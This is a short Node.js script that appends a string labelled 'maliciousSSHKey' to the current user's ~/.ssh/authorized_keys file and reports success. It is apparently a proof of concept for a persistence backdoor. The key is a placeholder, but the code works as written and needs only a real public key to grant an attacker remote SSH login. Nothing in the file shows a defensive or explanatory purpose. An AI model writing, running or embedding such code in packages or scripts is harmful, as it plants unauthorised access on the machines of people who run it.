const fs = require('node:fs');

let authorized_keys
try {
  const homedir = require('os').homedir();
  authorized_keys = fs.openSync(`${homedir}/.ssh/authorized_keys`, 'a', 0o600)
  fs.appendFileSync(authorized_keys, 'maliciousSSHKey', 'utf-8')
  console.log('maliciousSSHKey successfully written');
} catch (err) {
  console.error('Error! Could not write to authorized_keys');
  console.log(err)
} finally {
  if (authorized_keys) {
    fs.closeSync(authorized_keys)
  }
}
